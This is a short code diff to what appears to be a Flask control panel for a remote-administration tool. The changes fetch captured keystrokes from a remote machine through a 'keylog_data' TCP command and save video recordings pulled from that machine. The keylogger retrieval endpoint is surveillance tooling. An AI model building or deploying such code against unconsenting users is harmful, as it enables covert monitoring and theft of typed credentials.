@@ -89,7 +89,7 @@ def save_video_locally(seconds):
             return "[ERROR] Failed to download video from server"
         
         # Tạo thư mục lưu trên Client
-        save_dir = "client_recordings"
+        save_dir = "recordings"
         os.makedirs(save_dir, exist_ok=True)
         
         filename = f"{save_dir}/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
@@ -170,9 +170,14 @@ def api_apps_status():
 
 @app.route("/keylogger_data")
 def keylogger_data():
-    try: 
-        with open("web_keylog.txt", "r") as f: keys = f.read()
-    except: keys = ""
+    # SỬA LỖI: Thay vì đọc file local, hãy hỏi Server nội dung file
+    # Server đã có lệnh "keylog_data" để trả về nội dung này
+    keys = send_tcp_command("keylog_data")
+    
+    # Kiểm tra nếu kết nối lỗi
+    if keys.startswith("[ERROR]"):
+        keys = ""
+        
     return jsonify({"keys": keys})
 
 @app.route("/logkey_web", methods=["POST"])
